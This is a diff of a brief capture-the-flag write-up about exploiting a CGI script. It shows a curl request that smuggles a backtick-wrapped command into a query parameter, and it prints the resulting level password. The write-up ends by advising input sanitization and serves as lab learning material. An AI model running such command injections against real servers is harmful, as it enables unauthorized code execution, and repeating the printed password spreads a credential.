@@ -27,10 +27,10 @@ First, we need to focus on /home script and find a way to execute CGI
             - ```curl localhost:4747?x=\`getflag\` ```
 
 ## Solution
-no flag
 ```curl localhost:4747?x=\`getflag\` ```
 
-level05 : ne2searoevaevoem4ov4ar8ap
+- no flag
+- level05 : ne2searoevaevoem4ov4ar8ap
 
 ## Resolve problem
 - never trust users, always sanitize your data
